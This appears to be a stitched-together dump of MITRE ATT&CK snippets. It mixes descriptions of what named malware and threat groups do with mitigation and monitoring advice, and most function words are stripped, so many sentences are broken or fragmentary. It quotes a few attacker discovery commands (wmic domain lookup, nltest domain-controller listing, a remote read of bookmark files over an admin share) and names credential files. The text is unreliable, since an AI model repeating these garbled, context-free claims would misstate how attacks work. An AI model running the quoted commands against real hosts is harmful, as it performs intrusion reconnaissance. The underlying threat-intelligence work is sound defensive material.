July 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154)'s Beacon payload collect process details.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) Protect shared folders minimizing users write access. (Citation: ClearSky Lazarus Aug 2020) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) predefined users passwords execute brute force attacks SSH, FTP, POP3, MySQL, MSSQL, PostgreSQL services.(Citation: ANSSI Sandworm January 2021) [APT33](https://attack.mitre.org/groups/G0064) malicious e-mail attachments lure victims executing malware.(Citation: Holmium June 2020) [MoleNet](https://attack.mitre.org/software/S0553) WMI commands check firewall antivirus software.(Citation: Cybereason Molerats Dec 2020) (Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: Secureworks IRON HEMLOCK Profile) Operators deploying [Netwalker](https://attack.mitre.org/software/S0457) psexec certutil retrieve [Netwalker](https://attack.mitre.org/software/S0457) payload.(Citation: Sophos Netwalker 2020) [Aria-body](https://attack.mitre.org/software/S0456) ability inject process rundll32.exe dllhost.exe.(Citation: CheckPoint Naikon 2020) [Cuba](https://attack.mitre.org/software/S0625) disguised legitimate 360 Total Security Antivirus OpenVPN programs.(Citation: McAfee Cuba April 2021)  Depending method obfuscate API function calls, file-based signature capable detecting dynamical resolution.(Citation: Huntress API Hash)(Citation: BlackHat API Packers)(Citation: MITRECND FindAPIHash) [WINERACK](https://attack.mitre.org/software/S0219) gather host.(Citation: FireEye APT37 Feb 2018) Monitor API calls create modify Windows services (ex: ` CreateServiceW()`) repeatedly execute malicious payloads persistence. [ShimRatReporter](https://attack.mitre.org/software/S0445) encrypted gathered combination shifting XOR static key.(Citation: FOX-IT 2016 Mofang) [GrimAgent](https://attack.mitre.org/software/S0632) ability C2 communications.(Citation: IB GrimAgent July 2021) application control configured block execution MMC required network prevent potential misuse adversaries. [APT3](https://attack.mitre.org/groups/G0022) keylogging tool records keystrokes encrypted files.(Citation: Symantec Buckeye) Monitor third-party application logging, messaging, artifacts rely specific actions user gain execution. [Cherry Picker](https://attack.mitre.org/software/S0107) exfiltrates files FTP.(Citation: Trustwave Cherry Picker) [Pisloader](https://attack.mitre.org/software/S0124) command collect victim information, including OS version.(Citation: Palo Alto DNS Requests) [RedLeaves](https://attack.mitre.org/software/S0153) attempts add shortcut file Startup folder achieve persistence. fails, attempts add Registry keys.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Accenture Hogfish April 2018) Ensure application component binaries signed correct application developers.  [Rising Sun](https://attack.mitre.org/software/S0448) dynamic API resolutions Windows APIs leveraging `LoadLibrary()` `GetProcAddress()`.(Citation: McAfee Sharpshooter December 2018) Enforce binaries signed correct Apple Developer IDs. (Citation: Security Intelligence Eggs Aug 2019) [InvisiMole](https://attack.mitre.org/software/S0260) attempted disguise registering seemingly legitimate service name.(Citation: ESET InvisiMole June 2020) [ZxShell](https://attack.mitre.org/software/S0412) create service execution.(Citation: Talos ZxShell Oct 2014) Monitor executed commands arguments exfiltrate data cloud storage service primary command control channel. [RedLeaves](https://attack.mitre.org/software/S0153) enumerate drives Remote Desktop sessions.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Mimikatz](https://attack.mitre.org/software/S0002)'s `CRYPTO` module create export types authentication certificates.(Citation: Adsecurity Mimikatz Guide) [Cardinal RAT](https://attack.mitre.org/software/S0348) watchdog functionality ensures process running, spawns instance.(Citation: PaloAlto CardinalRat Apr 2017) [POWRUNER](https://attack.mitre.org/software/S0184) capture screenshot victim.(Citation: FireEye APT34 Dec 2017) [Dyre](https://attack.mitre.org/software/S0024) ability send staged compromised host externally C2.(Citation: Malwarebytes Dyreza November 2015) [Volgmer](https://attack.mitre.org/software/S0180) gather TCP connection state.(Citation: Symantec Volgmer Aug 2014) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) leaked malware, including DoublePulsar, EternalBlue, EternalRocks, EternalSynergy, operations.(Citation: ESET BackdoorDiplomacy Jun 2021) Ensure authorized allowed access critical resources audit access lists regularly. [Bazar](https://attack.mitre.org/software/S0534) establish persistence writing shortcuts Windows Startup folder.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) [EVILNUM](https://attack.mitre.org/software/S0568) Windows Management Instrumentation (WMI) tool enumerate infected machines.(Citation: Prevailion EvilNum 2020) [Ramsay](https://attack.mitre.org/software/S0458) extract agent body malicious document.(Citation: Eset Ramsay 2020)	 [Crimson](https://attack.mitre.org/software/S0115) module steal credentials browsers victim machine.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) files immutable changeable administrators limit ability adversaries easily create user level persistence. Anti-virus automatically quarantine suspicious files. [Azorult](https://attack.mitre.org/software/S0344) capture screenshots victim’s machines.(Citation: Unit42 Azorult Nov 2018) [Pisloader](https://attack.mitre.org/software/S0124) commands list drives victim machine list file directory.(Citation: Palo Alto DNS Requests) variant [RATANKBA](https://attack.mitre.org/software/S0241) PowerShell script traditional form.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [Shamoon](https://attack.mitre.org/software/S0140) C2.(Citation: Palo Alto Shamoon Nov 2016) Monitor executed commands arguments actions target Exchange server, Office 365, Google Workspace collect sensitive information. [Ecipekac](https://attack.mitre.org/software/S0624) download additional payloads compromised host.(Citation: Securelist APT10 March 2021) [WellMess](https://attack.mitre.org/software/S0514) HTTPS C2 communications.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020)(Citation: NCSC APT29 July 2020) (Citation: Symantec Whitefly March 2019) [Mosquito](https://attack.mitre.org/software/S0256) leverages CreateProcess() LoadLibrary() calls execute files .dll .exe extensions.(Citation: ESET Turla Mosquito Jan 2018) [FIN8](https://attack.mitre.org/groups/G0061) injected malicious code svchost.exe process.(Citation: Bitdefender FIN8 July 2021) [ABK](https://attack.mitre.org/software/S0469) ability [cmd](https://attack.mitre.org/software/S0106) Portable Executable (PE) compromised host.(Citation: Trend Micro Tick November 2019) [TajMahal](https://attack.mitre.org/software/S0467) ability capture keystrokes infected host.(Citation: Kaspersky TajMahal April 2019) [JHUHUGIT](https://attack.mitre.org/software/S0044) dropper delete victim. [JHUHUGIT](https://attack.mitre.org/software/S0044) variant capability delete files.(Citation: ESET Sednit 1)(Citation: Unit 42 Sofacy Feb 2018) Applications send push notifications verify login form multi-factor authentication (MFA). Train users accept valid push notifications report suspicious push notifications. [APT28](https://attack.mitre.org/groups/G0007) tool infect connected USB devices transmit air-gapped computers infected USB device inserted.(Citation: SIR 19) [Valak](https://attack.mitre.org/software/S0476) delivered malicious links e-mail.(Citation: SentinelOne Valak June 2020) Monitor files unexpected modifications internal external websites unplanned content changes. [Reaver](https://attack.mitre.org/software/S0172) collects victim, including CPU speed, name, volume serial number, ANSI code page, OEM code identifier OS, Windows version, memory information.(Citation: Palo Alto Reaver Nov 2017) Authentication, Authorization, Accounting (AAA) systems limit actions administrators perform provide history user actions detect unauthorized abuse. TACACS+ control commands administrators permitted configuration authentication command authorization(Citation: Cisco IOS Software Integrity Assurance - AAA) (Citation: Cisco IOS Software Integrity Assurance - TACACS) Enforce principle privilege limiting privileges user accounts authorized accounts modify add server software components.(Citation: NSA ASD Detect Prevent Shells 2020) [Cobalt Group](https://attack.mitre.org/groups/G0080) leveraged open-source tool called SoftPerfect Network Scanner perform network scanning.(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017) [Egregor](https://attack.mitre.org/software/S0554) encoded PowerShell command service created [Cobalt Strike](https://attack.mitre.org/software/S0154) lateral movement.(Citation: Intrinsec Egregor Nov 2020) Block execution Regsvcs.exe Regasm.exe required network prevent potential misuse adversaries. (Citation: Symantec Strider Blog)(Citation: Kaspersky ProjectSauron Blog) Command arguments invocation msiexec.exe determining origin purpose MSI files DLLs executed. Monitor executed commands arguments actions perform remote behavior [APT-C-36](https://attack.mitre.org/groups/G0099) spearphishing emails password protected RAR attachment avoid detected email gateway.(Citation: QiAnXin APT-C-36 Feb2019)  (Citation: Lazarus RATANKBA) [RGDoor](https://attack.mitre.org/software/S0258) uploads downloads files victim’s machine.(Citation: Unit 42 RGDoor Jan 2018) [MuddyWater](https://attack.mitre.org/groups/G0069) tool steals passwords saved victim email.(Citation: Symantec MuddyWater Dec 2018) Monitor WinRM environment tracking service execution. disabled, indicator suspicious behavior. Monitor unexpected file access removable media [TajMahal](https://attack.mitre.org/software/S0467) ability identify connected Apple devices.(Citation: Kaspersky TajMahal April 2019) [FALLCHILL](https://attack.mitre.org/software/S0181) installed Windows service.(Citation: CISA AppleJeus Feb 2021) [HotCroissant](https://attack.mitre.org/software/S0431) ability real time screen viewing infected host.(Citation: Carbon Black HotCroissant April 2020) [EnvyScout](https://attack.mitre.org/software/S0634) protocol handlers coax operating send NTLMv2 authentication responses attacker-controlled infrastructure.(Citation: MSTIC Nobelium Toolset 2021) [BOOSTWRITE](https://attack.mitre.org/software/S0415) exploited loading legitimate Dwrite.dll file loading gdi library, loads gdiplus library ultimately loads local Dwrite dll.(Citation: FireEye FIN7 Oct 2019) [PowerSploit](https://attack.mitre.org/software/S0194) modules <code>Get-NetDomainTrust</code> <code>Get-NetForestTrust</code> enumerate domain forest trusts.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) (Citation: DragonOK) Restrict storage execution SIP DLLs protected directories, C:\\Windows, user directories. multi-factor authentication restrict access resources cloud storage APIs.(Citation: Amazon S3 Security, 2019) Monitor access file resources local accounts <code>/etc/passwd</code>, <code>/Users</code> directories, Windows SAM database. 

If access requires privileges, non-admin objects (such users processes) attempting access restricted file resources. monitoring blocking suspicious execution Active Directory PowerShell modules, <code>Set-ADUser</code> <code>Set-ADAccountControl</code>, change account configurations. [NETWIRE](https://attack.mitre.org/software/S0198) encrypt C2 communications.(Citation: Red Canary NETWIRE January 2020) possible, store separate cryptographic hardware local system.  [Magic Hound](https://attack.mitre.org/groups/G0059) tool `cmd /c wmic computersystem domain` discovery.(Citation: DFIR Report APT35 ProxyShell March 2022) [Empire](https://attack.mitre.org/software/S0363) command-line interface interact systems.(Citation: Github PowerShell Empire) [Chaes](https://attack.mitre.org/software/S0631) collected information, including machine OS version.(Citation: Cybereason Chaes Nov 2020) [FIN8](https://attack.mitre.org/groups/G0061) [dsquery](https://attack.mitre.org/software/S0105) Active Directory utilities enumerate hosts; <code>nltest.exe /dclist</code> retrieve list domain controllers.(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Bitdefender FIN8 July 2021) [Kimsuky](https://attack.mitre.org/groups/G0094) Visual Basic download malicious payloads.(Citation: ThreatConnect Kimsuky September 2020)(Citation: VirusBulletin Kimsuky October 2019)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021) [Kimsuky](https://attack.mitre.org/groups/G0094) malicious VBA macros maldocs disguised forms trigger victim types content lure.(Citation: Talos Kimsuky Nov 2021) [POWERSTATS](https://attack.mitre.org/software/S0223) useless code blocks counter analysis.(Citation: TrendMicro POWERSTATS V3 June 2019) [GALLIUM](https://attack.mitre.org/groups/G0093) dumped hashes authenticate machines pass hash.(Citation: Cybereason Soft Cell June 2019) [PipeMon](https://attack.mitre.org/software/S0501) modules stored disk seemingly benign names including file extension popular word processor.(Citation: ESET PipeMon 2020) (Citation: GALLIUM December 2019) [StreamEx](https://attack.mitre.org/software/S0142) obfuscates commands statically programmed fragments strings starting DLL. one-byte xor 0x91 encode configuration data.(Citation: Cylance Crew Feb 2017) [Empire](https://attack.mitre.org/software/S0363) processes running local remote systems.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019) [AppleSeed](https://attack.mitre.org/software/S0622) regsvr32.exe execution.(Citation: Malwarebytes Kimsuky June 2021) [ISMInjector](https://attack.mitre.org/software/S0189) creates scheduled tasks establish persistence.(Citation: OilRig Delivery Oct 2017) [IcedID](https://attack.mitre.org/software/S0483) packed encrypted loader module.(Citation: Juniper IcedID June 2020) [Saint Bot](https://attack.mitre.org/software/S1018) Base64 encode C2 communications.(Citation: Malwarebytes Saint Bot April 2021) endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) PowerShell scripts.(Citation: TrendMicro MacOS April 2018) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [DealersChoice](https://attack.mitre.org/software/S0243) communication C2 server.(Citation: Sofacy DealersChoice) [Meteor](https://attack.mitre.org/software/S0688) delete folder malicious scripts detects hostname `PIS-APP`, `PIS-MOB`, `WSUSPROXY`, `PIS-DB`.(Citation: Check Meteor Aug 2021) [PipeMon](https://attack.mitre.org/software/S0501) collect send local IP address, RDP information, network adapter physical address C2 beacon.(Citation: ESET PipeMon 2020) Windows 10, implemented protections called Credential Guard protect LSA secrets credentials forms credential dumping. configured default hardware firmware requirements. (Citation: TechNet Credential Guard) protect forms credential dumping. (Citation: GitHub SHB Credential Guard) Users trained identify social engineering techniques phishing emails. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors administrative utilities deliver Trojan components remote systems.(Citation: McAfee Night Dragon) [Spark](https://attack.mitre.org/software/S0543) POST requests communicate C2 server receive commands.(Citation: Unit42 Molerat Mar 2020)  [Proton](https://attack.mitre.org/software/S0279) macOS' .command file type script actions.(Citation: objsee mac malware 2017) [AADInternals](https://attack.mitre.org/software/S0677) written executed PowerShell.(Citation: AADInternals Documentation) [Xbash](https://attack.mitre.org/software/S0341) regsvr32 executing scripts.(Citation: Unit42 Xbash Sept 2018) [Lazarus Group](https://attack.mitre.org/groups/G0032) created email accounts spearphishing operations.(Citation: ESET Lazarus Jun 2020)(Citation: Kaspersky ThreatNeedle Feb 2021) [NETWIRE](https://attack.mitre.org/software/S0198) launch agents persistence.(Citation: Red Canary NETWIRE January 2020) (Citation: F-Secure Dukes)(Citation: Secureworks IRON HEMLOCK Profile) [WarzoneRAT](https://attack.mitre.org/software/S0670) include rootkit hide processes, files, startup.(Citation: Check Warzone Feb 2020) [PoetRAT](https://attack.mitre.org/software/S0428) ability overwrite scripts delete sandbox environment detected.(Citation: Talos PoetRAT April 2020) [PowGoop](https://attack.mitre.org/software/S1046) modified Base64 encoding mechanism send data C2 server.(Citation: CYBERCOM Iranian Intel Cyber January 2022) [Ryuk](https://attack.mitre.org/software/S0446) called <code>GetIpNetTable</code> attempt identify mounted drives hosts Address Resolution Protocol (ARP) entries.(Citation: CrowdStrike Ryuk January 2019)(Citation: Bleeping - Ryuk WoL)  [Metamorfo](https://attack.mitre.org/software/S0455) encrypted C2 commands AES-256.(Citation: ESET Casbaneiro Oct 2019)  [Metamorfo](https://attack.mitre.org/software/S0455) VBS code victims’ systems.(Citation: FireEye Metamorfo Apr 2018) [GrimAgent](https://attack.mitre.org/software/S0632) collect OS, build version compromised host.(Citation: IB GrimAgent July 2021) [Fysbis](https://attack.mitre.org/software/S0410) installed autostart entry <code>~/.config/autostart/dbus-inotifier.desktop</code> establish persistence.(Citation: Fysbis Dr Analysis) Monitor newly executed processes objects, invoked user logged on. [Bumblebee](https://attack.mitre.org/software/S1039) object execute queries gather information.(Citation: Proofpoint Bumblebee April 2022) [schtasks](https://attack.mitre.org/software/S0111) schedule tasks Windows specific time.(Citation: TechNet Schtasks) Monitor attempt user gain access network computing resource, providing credentials alternate authentication material, password hashes, Kerberos tickets, application access tokens, laterally environment bypass normal access controls. [Doki](https://attack.mitre.org/software/S0600) executed Docker daemon API port.(Citation: Intezer Doki July 20) Monitor executed processes modify access tokens operate user security context perform actions bypass access controls. Monitor boot including uptime, image booted, startup configuration determine consistent expected behavior environment.  (Citation: Cisco IOS Software Integrity Assurance - Boot Information) Monitor unusual connections connection attempts device target TFTP file-sharing protocols. [Sandworm Team](https://attack.mitre.org/groups/G0034) collected username compromised host.(Citation: District Court Indictment GRU Unit 74455 October 2020) Restrict storage execution Control Panel items protected directories, <code>C:\Windows</code>, user directories. Enabled features, Protected Process Light (PPL), LSA.(Citation: LSA) [APT3](https://attack.mitre.org/groups/G0022) pack tools.(Citation: APT3 Adversary Emulation Plan)(Citation: FireEye Clandestine Wolf)  [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors downloaded additional files infected system.(Citation: FoxIT Wocao December 2019) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create Launch Daemons. Monitor newly executed processes discover remote systems, <code>ping.exe</code> <code>tracert.exe</code>, executed quick succession.(Citation: Elastic - Koadiac Detection EQL) Monitor executed commands arguments abuse Windows service control manager execute malicious commands payloads. Monitor analyze traffic flows follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). (Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: CitizenLab Tropic Trooper Aug 2018) [DownPaper](https://attack.mitre.org/software/S0186) command line.(Citation: ClearSky Charming Kitten Dec 2017) Correlate security systems login unused features restrict access scripting engines VBScript scriptable administration frameworks PowerShell. Monitor executed commands arguments files logical drive evade common file protections. technique [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging PowerShell scripts recommended. [WellMess](https://attack.mitre.org/software/S0514) junk data Base64 string additional obfuscation.(Citation: CISA WellMess July 2020) [SysUpdate](https://attack.mitre.org/software/S0663) WMI execution compromised host.(Citation: Trend Micro Iron Tiger April 2021) [Dtrack](https://attack.mitre.org/software/S0567)’s download upload file victim’s computer.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [Lucifer](https://attack.mitre.org/software/S0532) infect victims brute forcing SMB.(Citation: Unit 42 Lucifer June 2020) Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>CreateRemoteThread</code> modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) [MURKYTOP](https://attack.mitre.org/software/S0233) capability retrieve users remote hosts.(Citation: FireEye Periscope March 2018) authentication required access exposed remote service, monitor follow-on activities anomalous external exposed API application. [NOKKI](https://attack.mitre.org/software/S0353) gather drives operating victim’s machine.(Citation: Unit 42 NOKKI Sept 2018) [StrifeWater](https://attack.mitre.org/software/S1034) collect data compromised host.(Citation: Cybereason StrifeWater Feb 2022) [CharmPower](https://attack.mitre.org/software/S0674) `wmic` gather system.(Citation: Check APT35 CharmPower January 2022) [Andariel](https://attack.mitre.org/groups/G0138) downloaded additional tools malware compromised hosts.(Citation: AhnLab Andariel Subgroup Lazarus June 2018) [CaddyWiper](https://attack.mitre.org/software/S0693) list current processes.(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ) [Metamorfo](https://attack.mitre.org/software/S0455) hidden GUI ShowWindow() WINAPI call.(Citation: Medium Metamorfo Apr 2020)  [jRAT](https://attack.mitre.org/software/S0283) gather victim internal external IPs.(Citation: Kaspersky Adwind Feb 2016) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) enumerate map ICS-specific systems victim environments.(Citation: Gigamon Berserk Bear October 2021) [BlackEnergy](https://attack.mitre.org/software/S0089) [Systeminfo](https://attack.mitre.org/software/S0096) gather OS version, configuration, BIOS, motherboard, processor.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014) [APT38](https://attack.mitre.org/groups/G0082) created services modified existing executables, commands, scripts.(Citation: CISA AA20-239A BeagleBoyz August 2020) File encryption enforced email communications sensitive access email services. [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool enumerate proxy settings target environment.(Citation: Zscaler APT31 Covid-19 October 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Trusted Platform Module technology secure trusted boot process prevent integrity compromised. Check integrity existing BIOS EFI determine vulnerable modification. (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Lazarus Group](https://attack.mitre.org/groups/G0032) hosted malicious files compromised [Lazarus Group](https://attack.mitre.org/groups/G0032)-controlled servers.(Citation: ClearSky Lazarus Aug 2020)(Citation: ESET Lazarus Jun 2020)(Citation: McAfee Lazarus Nov 2020) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers WMI, including directory, build number, serial number, version, manufacturer, model, total physical memory.(Citation: Citizen Lab Stealth Falcon 2016) [Ajax Security Team](https://attack.mitre.org/groups/G0130) Wrapper/Gholee, custom-developed malware, downloaded additional malware infected system.(Citation: Check Rocket Kitten) Ensure strong password (ideally 25+ characters) complexity service accounts passwords periodically expire. (Citation: AdSecurity Cracking Kerberos Dec 2015) Managed Service Accounts party product password vaulting. (Citation: AdSecurity Cracking Kerberos Dec 2015) [BackConfig](https://attack.mitre.org/software/S0475) compromised victims links URLs hosting malicious content.(Citation: Unit 42 BackConfig 2020) [StoneDrill](https://attack.mitre.org/software/S0380) VBS scripts malware's lifecycle.(Citation: Kaspersky StoneDrill 2017)	 [FlawedAmmyy](https://attack.mitre.org/software/S0381) obfuscate portions initial C2 handshake.(Citation: Proofpoint TA505 Mar 2018) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) searched Activity Monitor process Events process list kills process running. [macOS.OSAMiner](https://attack.mitre.org/software/S1048) searches operating system's `install.log` apps matching hardcoded list, killing matching process names.(Citation: SentinelLabs reversing run-only applescripts 2021) [Empire](https://attack.mitre.org/software/S0363) upload download victim machine.(Citation: Github PowerShell Empire) [Mustang Panda](https://attack.mitre.org/groups/G0129) names `adobeupdate.dat` `PotPlayerDB.dat` disguise [PlugX](https://attack.mitre.org/software/S0013), file named `OneDrive.exe` load [Cobalt Strike](https://attack.mitre.org/software/S0154) payload.(Citation: Recorded Future REDDELTA July 2020) [Silence](https://attack.mitre.org/groups/G0091) attempts users launch malicious attachments delivered spearphishing emails.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) [SDBbot](https://attack.mitre.org/software/S0461) ability command execute commands compromised host.(Citation: Proofpoint TA505 October 2019) [Pillowmint](https://attack.mitre.org/software/S0517) encrypted stolen credit card AES encoded Base64.(Citation: Trustwave Pillowmint June 2020)	 [Hildegard](https://attack.mitre.org/software/S0601) started monero service.(Citation: Unit 42 Hildegard Malware) Monitor executed commands arguments attempt gather language victim infer geographical location host. [Fox Kitten](https://attack.mitre.org/groups/G0117) WizTree network files directory listings.(Citation: CISA AA20-259A Iran-Based Actor September 2020) (Citation: Novetta-Axiom)(Citation: Cisco 72) InstallUtil environment. [Bumblebee](https://attack.mitre.org/software/S1039) search tools static analysis.(Citation: Medium Ali Salem Bumblebee April 2022) [Derusbi](https://attack.mitre.org/software/S0021) collects current parent process IDs.(Citation: Fidelis Turbo)(Citation: FireEye Periscope March 2018) [Chimera](https://attack.mitre.org/groups/G0114) <code>type \\<hostname>\c$\Users\<username>\Favorites\Links\Bookmarks bar\Imported IE\*citrix*</code> bookmark discovery.(Citation: NCC Chimera January 2021) [SUNBURST](https://attack.mitre.org/software/S0559) C2 data attempted benign XML .NET assemblies faux JSON blob.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: FireEye SUNBURST Additional Details Dec 2020)(Citation: Symantec Sunburst Sending Data January 2021) Monitor executed commands arguments delete alter generated artifacts persistence host system. [Derusbi](https://attack.mitre.org/software/S0021) capable enumerating Registry values.(Citation: FireEye Periscope March 2018) [SNUGRIDE](https://attack.mitre.org/software/S0159) encrypts C2 traffic AES static key.(Citation: FireEye APT10 April 2017) Block Traffic	Upon identifying compromised network device bridge network boundary, block malicious packets unaffected network device path, firewall router compromised.  Continue monitor additional activity ensure blocks effective. [Clambling](https://attack.mitre.org/software/S0660) store file named `mpsvc.dll`, malicious `mpsvc.mui` file, folder legitimate executable `MsMpEng.exe` gain execution.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) Periodically check integrity running configuration image ensure modified. (Citation: Cisco IOS Software Integrity Assurance - Image File Verification) (Citation: Cisco IOS Software Integrity Assurance - Image File Integrity) (Citation: Cisco IOS Software Integrity Assurance - Change Control)  [MacMa](https://attack.mitre.org/software/S1016) TLS encryption initialize custom protocol C2 communications.(Citation: ESET DazzleSpy Jan 2022) [NanoCore](https://attack.mitre.org/software/S0336) communicates C2 ports 6666 4782.(Citation: Unit 42 Gorgon Aug 2018)(Citation: PaloAlto NanoCore Feb 2016) MacOS systems, monitor modifications <code>RulesActiveState.plist</code>, <code>SyncedRules.plist</code>, <code>UnsyncedRules.plist</code>, <code>MessageRules.plist</code> files.(Citation: MacOS Email Rules) [Kobalos](https://attack.mitre.org/software/S0641) record hostname kernel version target machine.(Citation: ESET Kobalos Jan 2021) Review authentication logs ensure mechanisms enforcement MFA functioning intended.

Periodically review hybrid identity solution discrepancies. example, review Pass Authentication (PTA) agents Azure Management Portal identify unwanted unapproved ones.(Citation: Mandiant Azure Backdoors) ADFS use, review DLLs executable files FS Global Assembly Cache directories ensure signed Microsoft. Note binaries catalog-signed, file unsigned viewing file properties.(Citation: MagicWeb) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) tools [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: RedCanary Mockingbird 2020) (Citation: Cymmetria Patchwork) [SideTwist](https://attack.mitre.org/software/S0610) embed C2 responses source code fake Flickr webpage.(Citation: Check APT34 April 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [Meteor](https://attack.mitre.org/software/S0688) check specific process running, Kaspersky's `avp.exe`.(Citation: Check Meteor Aug 2021) [Empire](https://attack.mitre.org/software/S0363) timestomp files payloads target machine blend in.(Citation: Github PowerShell Empire) [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) established SSL certificates typo-squatted domains registered.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [InvisiMole](https://attack.mitre.org/software/S0260) undergone regular technical improvements attempt evade detection.(Citation: ESET InvisiMole June 2020) (Citation: Baumgartner Naikon 2015) Monitor activation invocation container (ex: docker start docker restart) [FlawedAmmyy](https://attack.mitre.org/software/S0381) installed `msiexec.exe`.(Citation: Korean FSI TA505 2020)  [StoneDrill](https://attack.mitre.org/software/S0380) screenshots.(Citation: Kaspersky StoneDrill 2017)	 [FIN6](https://attack.mitre.org/groups/G0037) Stealer credential stealer target browsers.(Citation: Visa FIN6 Feb 2019) [WhisperGate](https://attack.mitre.org/software/S0689) download additional stages malware Discord CDN channel.(Citation: WhisperGate January 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [EnvyScout](https://attack.mitre.org/software/S0634) folder icons malicious files lure victims them.(Citation: MSTIC Nobelium Toolset 2021) [PLEAD](https://attack.mitre.org/software/S0435) RC4 encryption download modules.(Citation: JPCert PLEAD Downloader June 2018) [Turian](https://attack.mitre.org/software/S0647) scan removable media collect data.(Citation: ESET BackdoorDiplomacy Jun 2021) [Egregor](https://attack.mitre.org/software/S0554) perform language check infected query CPU (cupid).(Citation: JoeSecurity Egregor 2020)(Citation: NHS Digital Egregor Nov 2020) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher CreateProcessW API execution.(Citation: ESET Attor Oct 2019) [ZxShell](https://attack.mitre.org/software/S0412) feature capture remote computer's keystrokes keylogger.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)  [PowerDuke](https://attack.mitre.org/software/S0139) achieves persistence Registry keys.(Citation: Volexity PowerDuke November 2016) [APT3](https://attack.mitre.org/groups/G0022) create enable accounts, <code>support_388945a0</code>.(Citation: aptsim) Ensure valid password filters registered. Filter DLLs Windows installation directory (<code>C:\Windows\System32\</code> default) domain controller local entry <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>. (Citation: Install Password Filter n.d) [Umbreon](https://attack.mitre.org/software/S0221) creates valid local users provide access system.(Citation: Umbreon Trend Micro) [Proxysvc](https://attack.mitre.org/software/S0238) overwrite files attacker deleting them.(Citation: McAfee GhostSecret) Application developers uploading public code repositories careful avoid publishing sensitive credentials API keys. [JCry](https://attack.mitre.org/software/S0389) observed deleting shadow copies ensure data restored easily.(Citation: Carbon Black JCry 2019)	 [RTM](https://attack.mitre.org/software/S0148) process integrity levels.(Citation: ESET RTM Feb 2017) [netsh](https://attack.mitre.org/software/S0108) discover firewall settings.(Citation: TechNet Netsh)(Citation: TechNet Netsh Firewall) [Mythic](https://attack.mitre.org/software/S0699) supports domain fronting custom request headers.(Citation: Mythc Documentation)	 [TrickBot](https://attack.mitre.org/software/S0266) passwords stored files browsers Chrome, Firefox, Internet Explorer, Edge, [esentutl](https://attack.mitre.org/software/S0404).(Citation: Trend Micro Trickbot Nov 2018)(Citation: Cyberreason Anchor December 2019)(Citation: Bitdefender Trickbot VNC module Whitepaper 2021) [RCSession](https://attack.mitre.org/software/S0662) installed DLL side-loading.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [TA505](https://attack.mitre.org/groups/G0092) leveraged malicious Word documents abused DDE.(Citation: Proofpoint TA505 June 2018) Network segmentation isolate infrastructure components require broad network access. Monitor newly constructed network connections received untrusted hosts. Ritsol backdoor trojan 